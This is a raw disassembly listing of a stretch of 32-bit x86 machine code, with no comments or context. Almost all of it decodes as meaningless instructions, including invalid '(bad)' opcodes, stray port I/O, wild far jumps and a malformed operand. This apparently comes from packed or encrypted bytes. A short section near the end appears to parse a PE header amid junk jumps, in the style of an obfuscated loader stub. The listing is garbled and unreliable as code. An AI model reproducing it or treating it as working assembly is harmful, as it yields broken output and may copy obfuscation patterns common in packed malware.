  40f885:	adc    DWORD PTR [ebx+esi*8-0x6724d2a6],ebx
  40f88c:	xchg   ebx,eax
  40f88d:	into   
  40f88e:	rcr    BYTE PTR [eax+0x1e],1
  40f891:	mov    al,ds:0x1b1cdf1d
  40f896:	(bad)  
  40f897:	aam    0xa0
  40f899:	xchg   esi,eax
  40f89a:	dec    edx
  40f89b:	pushf  
  40f89c:	jecxz  0x40f910
  40f89e:	leave  
  40f89f:	gs push ebx
  40f8a1:	loop   0x40f852
  40f8a3:	daa    
  40f8a4:	push   edi
  40f8a5:	mov    ebx,0x5dea4d59
  40f8aa:	cmp    al,0xda
  40f8ac:	in     eax,dx
  40f8ad:	in     eax,dx
  40f8ae:	outs   dx,DWORD PTR ds:[esi]
  40f8af:	sbb    DWORD PTR [eax],0xb41f2a52
  40f8b5:	jg     0x40f870
  40f8b7:	int3   
  40f8b8:	jmp    0x2ae0:0x61c6cbbd
  40f8bf:	push   edx
  40f8c0:	aam    0x95
  40f8c2:	fiadd  WORD PTR [edx+0x689cca4]
  40f8c8:	push   ecx
  40f8c9:	pusha  
  40f8ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8cb:	pop    edi
  40f8cc:	jl     0x40f923
  40f8ce:	or     ah,bh
  40f8d0:	es ja  0x40f8c9
  40f8d3:	sbb    dh,BYTE PTR [edx+0x1d937513]
  40f8d9:	iret   
  40f8da:	mov    dl,0x58
  40f8dc:	add    eax,0x3ab63f9f
  40f8e1:	inc    BYTE PTR [ebx+edi*8]
  40f8e4:	mov    ebx,0x54bfc442
  40f8e9:	and    edi,DWORD PTR [eax+0x73bf02fc]
  40f8ef:	adc    al,0xcb
  40f8f1:	aad    0x49
  40f8f3:	sbb    DWORD PTR [esi-0x4e839582],ecx
  40f8f9:	add    BYTE PTR [edi],ch
  40f8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8fc:	jbe    0x40f884
  40f8fe:	test   DWORD PTR ds:0x2f120395,ebp
  40f904:	jecxz  0x40f897
  40f906:	test   BYTE PTR [ebx-0x5439906a],bl
  40f90c:	arpl   ax,bx
  40f90e:	fidiv  WORD PTR [ecx-0x7d]
  40f911:	leave  
  40f912:	cmp    edi,edx
  40f914:	pop    ebp
  40f915:	xor    esp,DWORD PTR [edi-0x60]
  40f918:	adc    al,cl
  40f91a:	push   edi
  40f91b:	sub    ch,al
  40f91d:	leave  
  40f91e:	shl    dl,1
  40f920:	add    BYTE PTR [edi],ch
  40f922:	mov    ds:0x55407a7f,eax
  40f927:	xchg   edx,eax
  40f928:	pop    es
  40f929:	push   ecx
  40f92a:	bound  ebp,QWORD PTR [ebx+0xd5d4df]
  40f930:	or     BYTE PTR [eax+eax*8-0x409bbc22],dh
  40f937:	retf   0xaafe
  40f93a:	sbb    BYTE PTR [edi-0x4f5cc308],ah
  40f940:	xlat   BYTE PTR ds:[ebx]
  40f941:	inc    ecx
  40f942:	scas   al,BYTE PTR es:[edi]
  40f943:	push   ss
  40f944:	js     0x40f947
  40f946:	dec    ebp
  40f947:	stos   BYTE PTR es:[edi],al
  40f948:	mov    bl,0x4b
  40f94a:	push   ecx
  40f94b:	(bad)  [ecx]
  40f94d:	ret    0xc0cc
  40f950:	aam    0x73
  40f952:	aam    0xf0
  40f954:	xor    BYTE PTR [edi-0x59b0f46],dl
  40f95a:	or     BYTE PTR ds:0xc2b5168a,ah
  40f960:	mov    ah,0x31
  40f962:	mov    ds:0x8cb4b18,eax
  40f967:	or     BYTE PTR [edi-0x59],cl
  40f96a:	push   ecx
  40f96b:	sub    al,0x55
  40f96d:	push   ebx
  40f96e:	add    al,0xa4
  40f970:	add    BYTE PTR [edi-0x24],0xda
  40f974:	repz stc 
  40f976:	xlat   BYTE PTR es:[ebx]
  40f978:	push   eax
  40f979:	lea    edi,[edi-0x10f221d5]
  40f97f:	mov    ebp,0x8b5c453f
  40f984:	in     al,0x27
  40f986:	pushf  
  40f987:	lock aad 0x85
  40f98a:	cmp    ebx,DWORD PTR [ecx+0x2d]
  40f98d:	repnz icebp 
  40f98f:	cmp    DWORD PTR ds:[esi+0x48],ebx
  40f993:	retf   0x9ad
  40f996:	test   eax,0x50d8a4d2
  40f99b:	fnstsw WORD PTR [esi*1-0x2f50cd6a]
  40f9a2:	loopne 0x40f9d3
  40f9a4:	add    al,0x45
  40f9a6:	in     al,dx
  40f9a7:	xchg   ebx,eax
  40f9a8:	mov    bl,0x10
  40f9aa:	add    al,0x7d
  40f9ac:	xchg   edx,eax
  40f9ad:	mov    ah,0x1c
  40f9af:	cmp    BYTE PTR [edi],0xc6
  40f9b2:	xchg   ecx,eax
  40f9b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9b4:	leave  
  40f9b5:	(bad)  
  40f9b6:	xchg   ecx,eax
  40f9b7:	push   es
  40f9b8:	test   DWORD PTR [esi+0x6ce2537],ebx
  40f9be:	outs   dx,DWORD PTR ds:[esi]
  40f9bf:	imul   ebp,DWORD PTR [ebx],0xb70ba03e
  40f9c5:	stc    
  40f9c6:	inc    ebx
  40f9c7:	loopne 0x40f9d0
  40f9c9:	and    ah,BYTE PTR [esi+ebp*8]
  40f9cc:	imul   eax,DWORD PTR [edi],0x23427042
  40f9d2:	inc    ebp
  40f9d3:	adc    eax,0xbfbe4e63
  40f9d8:	pop    ds
  40f9d9:	mov    eax,0x8bfe692
  40f9de:	cmp    edx,DWORD PTR [edx+0xa]
  40f9e1:	es mov ebp,0xc59b840
  40f9e7:	sub    cl,BYTE PTR [ebp-0x6c7159e7]
  40f9ed:	pop    ds
  40f9ee:	in     al,dx
  40f9ef:	xor    al,0x6f
  40f9f1:	jne    0x40f975
  40f9f3:	adc    BYTE PTR [edi],ah
  40f9f5:	inc    ecx
  40f9f6:	mov    ecx,ecx
  40f9f8:	push   ebp
  40f9f9:	aaa    
  40f9fa:	or     al,0x99
  40f9fc:	ds xchg ebx,eax
  40f9fe:	xchg   esp,eax
  40f9ff:	push   esp
  40fa00:	bound  edx,QWORD PTR [edi]
  40fa02:	jne    0x40fa52
  40fa04:	and    eax,0xdf369b8d
  40fa09:	xchg   al,al
  40fa0b:	cld    
  40fa0c:	iret   
  40fa0d:	xchg   edi,eax
  40fa0e:	mov    edi,0x3a823a7d
  40fa13:	mov    cl,0x65
  40fa15:	jns    0x40fa7b
  40fa17:	xchg   ebx,eax
  40fa18:	and    eax,0xb94b21c0
  40fa1d:	lock mov edx,0xc8027469
  40fa23:	xchg   ecx,eax
  40fa24:	(bad)  
  40fa25:	jg     0x40f9c7
  40fa27:	mov    dh,0x7e
  40fa29:	(bad)  
  40fa2a:	xchg   esi,eax
  40fa2b:	ja     0x40f9cd
  40fa2d:	xchg   ah,bh
  40fa2f:	js     0x40fa6f
  40fa31:	jg     0x40f9f5
  40fa33:	push   eax
  40fa34:	stos   BYTE PTR es:[edi],al
  40fa35:	add    al,0x81
  40fa37:	pop    esi
  40fa38:	lods   eax,DWORD PTR ds:[esi]
  40fa39:	fwait
  40fa3a:	(bad)  
  40fa3b:	and    ebx,DWORD PTR [ecx]
  40fa3d:	mov    cl,0x52
  40fa3f:	push   eax
  40fa41:	jo     0x40fab3
  40fa43:	ror    BYTE PTR [edx+0x6b],1
  40fa46:	loopne 0x40fa4b
  40fa48:	dec    ebp
  40fa49:	(bad)  
  40fa4a:	aad    0x38
  40fa4c:	and    ch,ch
  40fa4e:	icebp  
  40fa4f:	jno    0x40f9ee
  40fa51:	fsubr  DWORD PTR [edx-0x18e6bd61]
  40fa57:	dec    ecx
  40fa58:	sbb    DWORD PTR [edx-0x1f],esp
  40fa5b:	xor    BYTE PTR [esi-0x3d],ah
  40fa5e:	or     ebx,edi
  40fa60:	in     al,dx
  40fa61:	shl    BYTE PTR [eax],1
  40fa63:	sub    eax,0xbe003969
  40fa68:	(bad)
  40fa6c:	(bad)  
  40fa6d:	push   ecx
  40fa6e:	sbb    eax,0x680fb774
  40fa73:	or     al,dh
  40fa75:	cs test al,0x9e
  40fa78:	dec    eax
  40fa79:	pop    edi
  40fa7a:	dec    eax
  40fa7b:	ins    DWORD PTR es:[edi],dx
  40fa7c:	cmp    ecx,DWORD PTR [edx]
  40fa7e:	sbb    eax,0x29c513f3
  40fa83:	mov    esi,0x4464330d
  40fa88:	in     eax,0x91
  40fa8a:	pmulhw mm7,QWORD PTR [ecx+0x388494b0]
  40fa91:	sub    al,0xf5
  40fa93:	scas   eax,DWORD PTR es:[edi]
  40fa94:	in     eax,dx
  40fa95:	in     eax,dx
  40fa96:	cmp    eax,0x3c5cb968
  40fa9b:	addr16 mov ds:0x2ab4,al
  40fa9f:	mov    dl,0x72
  40faa1:	(bad)  
  40faa2:	out    0x6,al
  40faa4:	lods   eax,DWORD PTR ds:[esi]
  40faa5:	or     eax,0xc61ab0a1
  40faaa:	pop    esp
  40faab:	pushf  
  40faac:	in     al,dx
  40faad:	dec    edx
  40faae:	sbb    bl,BYTE PTR [edi]
  40fab0:	adc    ah,BYTE PTR [ebp+0x277cd3f4]
  40fab6:	pop    esp
  40fab7:	addr16 pusha 
  40fab9:	pop    es
  40faba:	cli    
  40fabb:	std    
  40fabc:	jbe    0x40faff
  40fabe:	fldcw  WORD PTR [eax-0x5a]
  40fac1:	ror    DWORD PTR [ebx+0x5c],1
  40fac4:	xor    eax,eax
  40fac6:	dec    ecx
  40fac7:	push   esp
  40fac8:	out    dx,eax
  40fac9:	daa    
  40faca:	adc    ah,BYTE PTR [edi]
  40facc:	retf   
  40facd:	pusha  
  40face:	push   eax
  40facf:	mov    bl,0x4b
  40fad1:	jbe    0x40fac2
  40fad3:	mov    dl,BYTE PTR [ecx]
  40fad5:	icebp  
  40fad6:	and    al,0xa6
  40fad8:	rcl    edi,cl
  40fada:	push   ds
  40fadb:	lea    ecx,[esi-0x2334c1f2]
  40fae1:	retf   
  40fae2:	or     BYTE PTR [edi],al
  40fae4:	ds push 0x53c0d430
  40faea:	sub    BYTE PTR [ecx+0x1dac7cbc],dh
  40faf0:	mov    al,ds:0x7d4e36a3
  40faf5:	fs cdq 
  40faf7:	mov    DWORD PTR [ebp+ecx*1+0x3eff77be],esi
  40fafe:	scas   eax,DWORD PTR es:[edi]
  40faff:	xrelease xchg DWORD PTR [ebx+esi*2],ecx
  40fb03:	adc    BYTE PTR [esp+eax*8],cl
  40fb06:	(bad)  
  40fb07:	fdiv   QWORD PTR [edx+0x7]
  40fb0a:	in     eax,dx
  40fb0b:	loope  0x40faea
  40fb0d:	and    al,0x12
  40fb0f:	pushf  
  40fb10:	test   BYTE PTR ds:0xc4065768,ch
  40fb16:	bound  edx,QWORD PTR ds:0x84b08593
  40fb1c:	pop    ss
  40fb1d:	retf   
  40fb1e:	mov    ds:0x2c226baf,eax
  40fb24:	xchg   BYTE PTR [esp+ecx*2-0x5daff6f6],bl
  40fb2b:	out    0x93,eax
  40fb2d:	loope  0x40fbab
  40fb2f:	cmp    edx,DWORD PTR [eax-0x77]
  40fb32:	push   ss
  40fb33:	cmp    al,0x6c
  40fb35:	fstp   DWORD PTR [edi-0x4f]
  40fb38:	sar    BYTE PTR [ebp+0x3993312e],1
  40fb3e:	(bad)  [ebx+0x68]
  40fb41:	into   
  40fb42:	popa   
  40fb43:	test   al,0xe2
  40fb45:	or     BYTE PTR [edi-0x4627a219],ch
  40fb4b:	jns    0x40fb29
  40fb4d:	in     al,dx
  40fb4e:	or     eax,DWORD PTR [eax-0x3a1e6afc]
  40fb54:	inc    eax
  40fb55:	out    dx,eax
  40fb56:	fld    DWORD PTR [di+0x61]
  40fb5a:	out    dx,eax
  40fb5b:	or     BYTE PTR [ecx],0x7e
  40fb5e:	xor    BYTE PTR [eax-0x16],dl
  40fb61:	aam    0x49
  40fb63:	fist   DWORD PTR [edi+0x87bd78a]
  40fb69:	pop    edx
  40fb6a:	cmp    edi,DWORD PTR [edx]
  40fb6c:	jl     0x40fb89
  40fb6e:	ins    BYTE PTR es:[edi],dx
  40fb6f:	cmp    DWORD PTR [ecx+0x3cf3eb12],esi
  40fb75:	push   ss
  40fb76:	push   es
  40fb77:	sahf   
  40fb78:	xrelease xchg DWORD PTR [ebx+edx*1-0x6e],edi
  40fb7d:	bound  eax,QWORD PTR [edx-0x49b8403e]
  40fb83:	push   es
  40fb84:	shr    bh,1
  40fb86:	adc    eax,DWORD PTR [esi-0x27b0e13f]
  40fb8c:	dec    ebp
  40fb8d:	sub    dl,BYTE PTR [eax]
  40fb8f:	sub    DWORD PTR [edi-0x19],edi
  40fb92:	xlat   BYTE PTR ds:[ebx]
  40fb93:	sar    DWORD PTR [ecx],1
  40fb95:	cmp    bh,ch
  40fb97:	scas   al,BYTE PTR es:[edi]
  40fb98:	loope  0x40fb39
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e124
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xc8
  40fbb3:	adc    DWORD PTR [eax+0x70b182c2],eax
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb7c
  40fbbf:	sub    DWORD PTR [ebp+ecx*8-0xe65c879],edx
  40fbc6:	mov    ch,0xe2
  40fbc8:	cmp    BYTE PTR [ecx+0x55],bh
  40fbcb:	rol    bl,1
  40fbcd:	test   al,0xb2
  40fbcf:	adc    al,0x2
  40fbd1:	dec    esi
  40fbd2:	inc    eax
  40fbd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbd4:	push   eax
  40fbd5:	jmp    FWORD PTR ds:0x4f2af069
  40fbdb:	and    DWORD PTR [esp+edx*1-0x66728f50],esp
  40fbe2:	push   ss
  40fbe3:	and    ebx,DWORD PTR [edi-0x2af598a]
  40fbe9:	adc    bh,BYTE PTR [edx+0x14]
  40fbec:	push   edi
  40fbed:	cmp    BYTE PTR [ebp+0xe5481be],cl
  40fbf3:	adc    edx,DWORD PTR [esi+0x3d]
  40fbf6:	xor    ah,0xd6
  40fbf9:	xor    al,0x29
  40fbfb:	push   es
  40fbfc:	ror    DWORD PTR [edi-0x5ff37708],1
  40fc02:	loopne 0x40fc60
  40fc04:	push   es
  40fc05:	enter  0x6246,0x7f
  40fc09:	cmp    ebx,DWORD PTR [ebp+esi*4+0x14d96f7b]
  40fc10:	out    dx,al
  40fc11:	rcr    DWORD PTR [edx+0x15],cl
  40fc14:	fdiv   QWORD PTR [edx]
  40fc16:	mov    al,BYTE PTR [ebp-0x3d]
  40fc19:	dec    esi
  40fc1a:	(bad)  
  40fc1b:	psubd  mm5,QWORD PTR [ebp-0x11021e6f]
  40fc22:	push   ss
  40fc23:	xchg   edi,eax
  40fc24:	inc    esp
  40fc25:	(bad)  
  40fc26:	sub    eax,0xeda3938f
  40fc2b:	(bad)  
  40fc2c:	inc    esi
  40fc2d:	inc    ebp
  40fc2e:	out    0x4f,al
  40fc30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc31:	cld    
  40fc32:	in     al,0x8a
  40fc34:	stc    
  40fc35:	jns    0x40fbf3
  40fc37:	jb     0x40fc08
  40fc39:	xchg   ecx,eax
  40fc3a:	jl     0x40fbe8
  40fc3c:	pop    esp
  40fc3d:	push   ebx
  40fc3e:	retf   0xed4a
  40fc41:	dec    ebp
  40fc42:	mov    ah,0x17
  40fc44:	or     BYTE PTR [edi],dl
  40fc46:	sbb    al,0xb6
  40fc48:	and    BYTE PTR [ecx-0x41255b6b],ah
  40fc4e:	ret    0x270
  40fc51:	cmp    eax,esi
  40fc53:	and    BYTE PTR ds:0x19ecd846,al
  40fc59:	jecxz  0x40fbf0
  40fc5b:	sub    cl,BYTE PTR [eax]
  40fc5d:	push   ebx
  40fc5e:	leave  
  40fc5f:	int    0x2d
  40fc61:	sub    al,0xa2
  40fc63:	outs   dx,BYTE PTR ds:[esi]
  40fc64:	int    0x85
  40fc66:	pop    ecx
  40fc67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc68:	pop    eax
  40fc69:	ss or  eax,0x9d2c5030
  40fc6f:	nop
  40fc70:	jbe    0x40fca6
  40fc72:	or     al,0x2c
  40fc74:	add    eax,0xc6871d32
  40fc79:	(bad)  
  40fc7a:	sub    eax,0x8abe0426
  40fc7f:	jg     0x40fc5c
  40fc81:	and    ah,ch
  40fc83:	mov    al,ds:0x42b31170
  40fc88:	push   es
  40fc89:	push   ebx
  40fc8a:	test   BYTE PTR [ebp+0x4a7ead6d],0xf5
  40fc91:	stos   BYTE PTR es:[edi],al
  40fc92:	xor    DWORD PTR [edi],ebp
  40fc94:	in     eax,dx
  40fc95:	sbb    ch,ch
  40fc97:	pop    edx
  40fc98:	push   esp
  40fc99:	outs   dx,DWORD PTR ds:[esi]
  40fc9a:	lods   eax,DWORD PTR ds:[esi]
  40fc9b:	(bad)  
  40fc9c:	push   0xffffff80
  40fc9e:	jmp    0x40fcae
  40fca0:	in     al,dx
  40fca1:	sti    
  40fca2:	dec    edx
  40fca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca4:	jae    0x40fcbf
  40fca6:	inc    ebp
  40fca7:	jno    0x40fcac
  40fca9:	rcr    DWORD PTR [edi+0x6e],0xee
  40fcad:	jmp    0xbab13019
  40fcb2:	(bad)  
  40fcb5:	push   0x93fc7f7c
  40fcba:	jb     0x40fc5b
  40fcbc:	stos   DWORD PTR es:[edi],eax
  40fcbd:	out    0xdf,al
  40fcbf:	inc    esp
  40fcc0:	vaddsubps ymm7,ymm5,YMMWORD PTR [esi+0x7e5ed3df]
  40fcc8:	add    al,0x8d
  40fcca:	push   ds
  40fccb:	xor    esi,edi
  40fccd:	pop    es
  40fcce:	lds    ebx,FWORD PTR [eax+0x75]
  40fcd1:	addr16 imul eax,edx,0xb04f095b
  40fcd8:	jecxz  0x40fcf5
  40fcda:	fsubr  st(1),st
  40fcdc:	push   ss
  40fcdd:	or     ah,BYTE PTR [eax]
  40fcdf:	xlat   BYTE PTR ds:[ebx]
  40fce0:	xlat   BYTE PTR ds:[ebx]
  40fce1:	jns    0x40fd30
  40fce3:	lea    esi,[eax+esi*8+0x50a11f5f]
  40fcea:	dec    ebx
  40fceb:	inc    edi
  40fced:	sub    bl,BYTE PTR [edx]
  40fcef:	sub    esp,eax
  40fcf1:	mov    ebp,0x7ad29c30
  40fcf6:	hlt    
  40fcf7:	inc    esp
  40fcf8:	lods   al,BYTE PTR ds:[esi]
  40fcf9:	mov    dh,0xcb
  40fcfb:	xchg   eax,eax
  40fcfd:	push   esp
  40fcfe:	mov    bl,0x3e
  40fd00:	test   edx,edx
  40fd02:	sbb    cl,BYTE PTR [edi-0x7a396516]
  40fd08:	xchg   ebp,eax
  40fd09:	adc    eax,0xe08557b8
  40fd0e:	out    0x1b,al
  40fd10:	dec    eax
  40fd11:	xchg   BYTE PTR [ebp+ebp*2+0x344d2192],al
  40fd18:	inc    ecx
  40fd19:	loop   0x40fcce
  40fd1b:	fs fcmovnbe st,st(7)
  40fd1e:	push   ss
  40fd1f:	jne    0x40fd2c
  40fd21:	lods   eax,DWORD PTR ds:[esi]
  40fd22:	mov    esi,0x852269d2
  40fd27:	add    ebp,DWORD PTR [ebp-0x39]
  40fd2a:	lods   al,BYTE PTR ds:[esi]
  40fd2b:	call   0xe711cd60
  40fd30:	jmp    0xf4f6:0x52abf4fa
  40fd37:	dec    eax
  40fd38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd39:	push   esp
  40fd3a:	into   
  40fd3b:	into   
  40fd3c:	inc    ebp
  40fd3d:	sbb    al,0x72
  40fd3f:	in     al,0x85
  40fd41:	pop    eax
  40fd42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd43:	mov    al,ds:0x17200034
  40fd48:	lahf   
  40fd49:	add    DWORD PTR [ebp+0x7e],0xffffff8b
  40fd4d:	jmp    0xccac:0x25d82d60
  40fd54:	inc    esi
  40fd55:	jge    0x40fd95
  40fd57:	inc    edi
  40fd58:	in     eax,0x39
  40fd5a:	mov    ds:0x1624c7d5,eax
  40fd5f:	mov    edi,0xad799e4f
  40fd64:	test   DWORD PTR [ebx-0x52172aa4],edx
  40fd6a:	xor    BYTE PTR [ebp-0x23],0x7
  40fd6e:	pop    ebp
  40fd6f:	mov    bl,0xf8
  40fd71:	mov    esi,0x7cae1f10
  40fd76:	(bad)
  40fd7a:	xchg   esp,eax
  40fd7b:	lock rcr DWORD PTR [edx],1
  40fd7e:	jmp    0xdf2515bf
  40fd83:	push   ebp
  40fd84:	fs xchg esp,eax
  40fd86:	nop
  40fd87:	add    esp,DWORD PTR [eax+0x73]
  40fd8a:	mov    ds:0xd960c1d1,eax
  40fd8f:	or     ebp,ecx
  40fd91:	pop    ebp
  40fd92:	jg     0x40fdd0
  40fd94:	loope  0x40fd87
  40fd96:	sbb    BYTE PTR [edi-0x58],al
  40fd99:	retf   0x79c2
  40fd9c:	mov    eax,0xe4a27132
  40fda1:	bnd jno 0x40fd83
  40fda4:	or     DWORD PTR [ebx+ecx*1-0x2a],0x3729f7ab
  40fdac:	into   
  40fdad:	cmc    
  40fdae:	xchg   edi,eax
  40fdaf:	cmp    eax,0x9cede5e2
  40fdb4:	sbb    eax,0xd3302955
  40fdb9:	cs push 0x71
  40fdbc:	jmp    0x40fdda
  40fdbe:	xor    dl,bl
  40fdc0:	test   BYTE PTR [eax-0x26],cl
  40fdc3:	sbb    eax,edi
  40fdc5:	mov    eax,DWORD PTR [edi]
  40fdc7:	retf   
  40fdc8:	dec    edi
  40fdc9:	pop    edi
  40fdca:	sub    eax,0x1eb05c7d
  40fdcf:	cmc    
  40fdd0:	idiv   al
  40fdd2:	mov    edx,0xc152fb37
  40fdd7:	fadd   DWORD PTR [ebx+0x751f1a04]
  40fddd:	sar    ebx,cl
  40fddf:	push   0x4f
  40fde1:	loopne 0x40fdd3
  40fde3:	lea    esp,ds:0x1efadb44
  40fde9:	das    
  40fdea:	xor    BYTE PTR [ecx-0xbeeb23a],ch
  40fdf0:	test   eax,0x1e6b388e
  40fdf5:	ins    BYTE PTR es:[edi],dx
  40fdf6:	cs jmp 0x33156820
  40fdfc:	sti    
  40fdfd:	inc    eax
  40fdfe:	cmc    
  40fdff:	lods   al,BYTE PTR ds:[esi]
  40fe00:	add    DWORD PTR [ebx],eax
  40fe02:	(bad)  
  40fe03:	out    0x1,al
  40fe05:	push   ds
  40fe06:	pop    ebp
  40fe07:	in     eax,0x61
  40fe09:	cmp    BYTE PTR [edi-0x7618680f],bh
  40fe0f:	fmul   QWORD PTR [edx-0x7f]
  40fe12:	jmp    0x40fdb5
  40fe14:	sbb    DWORD PTR [ebp+0x46bbf16e],0x67830d0e
  40fe1e:	and    al,0x1f
  40fe20:	and    al,0x26
  40fe22:	nop
  40fe23:	call   0x3672701b
  40fe28:	sub    DWORD PTR [eax+0x2bad1dfd],ebx
  40fe2e:	loope  0x40fdc1
  40fe30:	lods   eax,DWORD PTR ds:[esi]
  40fe31:	xchg   esp,eax
  40fe32:	or     eax,0x17865be9
  40fe37:	pop    ds
  40fe38:	mov    ecx,0x9fa41dbf
  40fe3d:	nop
  40fe3e:	add    al,0x6f
  40fe40:	in     eax,0xfb
  40fe42:	mov    ds:0xefccc08d,al
  40fe47:	jo     0x40fdfc
  40fe49:	jno    0x40fdeb
  40fe4b:	cmp    eax,DWORD PTR [ebp-0x3c]
  40fe4e:	imul   ebp,DWORD PTR [edi-0x1f],0xffffffc7
  40fe52:	xor    eax,0xcbb11b9c
  40fe57:	push   ebx
  40fe59:	push   es
  40fe5a:	sahf   
  40fe5b:	mov    dl,0x76
  40fe5d:	push   es
  40fe5e:	push   ecx
  40fe5f:	mov    ecx,0xa5b015f8
  40fe64:	sbb    DWORD PTR [edx-0x5187e311],esp
  40fe6a:	xor    eax,0xa11ee84e
  40fe6f:	cmp    DWORD PTR [ebp-0x20],eax
  40fe72:	imul   ebp,DWORD PTR [eax+0x16],0xdcefe134
  40fe79:	pop    esi
  40fe7a:	ins    DWORD PTR es:[edi],dx
  40fe7b:	cmp    eax,0x50604297
  40fe80:	fucomp st(4)
  40fe82:	mov    ?,edi
  40fe84:	int    0x29
  40fe86:	inc    ebx
  40fe87:	jl     0x40febb
  40fe89:	mov    al,ds:0xd8394c6d
  40fe8e:	test   BYTE PTR [edx+0x32],al
  40fe91:	clc    
  40fe92:	ins    DWORD PTR es:[edi],dx
  40fe93:	mov    esp,0x41e0e9b7
  40fe98:	sbb    eax,0x858b952c
  40fe9d:	xor    eax,0x26eee894
  40fea2:	xor    ebp,esp
  40fea4:	repz xor DWORD PTR ds:0x179af077,esi
  40feab:	add    DWORD PTR [edx-0xf8a1b1b],edx
  40feb1:	rcl    BYTE PTR fs:[edi+ecx*8-0x1aca20d4],cl
  40feb9:	pop    esp
  40feba:	adc    eax,0x9fc849b3
  40febf:	js     0x40ff2a
  40fec1:	dec    esp
  40fec2:	mov    al,ds:0x246eec03
  40fec7:	std    
  40fec8:	in     eax,0xb2
  40feca:	xlat   BYTE PTR ds:[ebx]
  40fecb:	adc    al,0x7d
  40fecd:	adc    al,0xc7
  40fecf:	iret   
  40fed0:	test   DWORD PTR [esi],esi
  40fed2:	adc    dh,BYTE PTR [esi+0x58]
  40fed5:	cmp    dh,BYTE PTR [ecx-0x5b8d3cd2]
  40fedb:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fedd:	mov    DWORD PTR [esi-0x57],0x84c125bc
  40fee4:	inc    ecx
  40fee5:	adc    BYTE PTR [eax+0x2e58580c],cl
  40feeb:	jmp    0x7f6bbacb
  40fef0:	dec    edx
  40fef1:	outs   dx,DWORD PTR ds:[esi]
  40fef2:	and    DWORD PTR [ebp+0x3c12d952],ebp
  40fef8:	xchg   esp,eax
  40fef9:	adc    BYTE PTR [ebx],bh
  40fefb:	fnstsw WORD PTR [ecx-0x6d63ea88]
  40ff01:	mov    ds:0x5982edf7,eax
  40ff06:	popf   
  40ff07:	scas   al,BYTE PTR es:[edi]
  40ff08:	cwde   
  40ff09:	mov    esi,0x41a1901a
  40ff0e:	retf   
  40ff0f:	out    dx,eax
  40ff10:	mov    dl,0xd9
  40ff12:	mov    esp,0x8088dc3
  40ff17:	push   ss
  40ff18:	shl    bh,cl
  40ff1a:	leave  
  40ff1b:	adc    eax,0xf7d6dfd3
  40ff20:	retf   0x3c1a
  40ff23:	cmp    bh,BYTE PTR [edx]
  40ff25:	jmp    0x3fd9eaf9
  40ff2a:	fisub  WORD PTR ds:0xc428ab48
  40ff30:	es add eax,0xcecc9253
  40ff36:	scas   al,BYTE PTR es:[edi]
  40ff37:	aad    0x9
  40ff39:	adc    DWORD PTR [eax+0x64],esp
  40ff3c:	push   cs
  40ff3d:	xor    eax,0xcc758906
  40ff42:	in     al,0x4a
  40ff44:	in     al,dx
  40ff45:	sbb    bl,BYTE PTR [esi]
  40ff47:	push   eax
  40ff48:	stc    
  40ff49:	push   edi
  40ff4a:	loopne 0x40ff16
  40ff4c:	dec    edi
  40ff4d:	and    al,ch
  40ff4f:	scas   eax,DWORD PTR es:[edi]
  40ff50:	mov    esi,0x7488a62f
  40ff55:	out    dx,eax
  40ff56:	out    dx,eax
  40ff57:	sub    al,0x5a
  40ff59:	adc    BYTE PTR [edi+0xf4b8179],bl
  40ff5f:	out    dx,eax
  40ff60:	les    edi,FWORD PTR [ecx+0x4b0a287b]
  40ff66:	push   ss
  40ff67:	ret    0x605a
  40ff6a:	pop    edi
  40ff6c:	inc    ebp
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loope  0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	nop
  40ffdd:	sti    
  40ffde:	inc    ecx
  40ffdf:	test   eax,0x7070bd35
  40ffe4:	mov    ds:0x5e70707d,eax
  40ffe9:	lods   al,BYTE PTR ds:[esi]
  40ffea:	repz dec eax
  40ffec:	test   DWORD PTR [ecx],esi
  40ffee:	inc    edx
  40ffef:	bound  ecx,QWORD PTR [ebx+0x8079157]
  40fff5:	arpl   WORD PTR [eax+edx*8],cx
  40fff8:	cmc    
  40fff9:	rol    BYTE PTR [eax-0x33],cl
  40fffc:	ins    BYTE PTR es:[edi],dx
  40fffd:	mov    bl,0xb
  40ffff:	xor    esp,DWORD PTR [ebp+0x122c9e4f]
  410005:	pop    ecx
  410006:	in     eax,0xaa
  410008:	mov    ecx,0x6ba9f287
  41000d:	mov    cl,dh
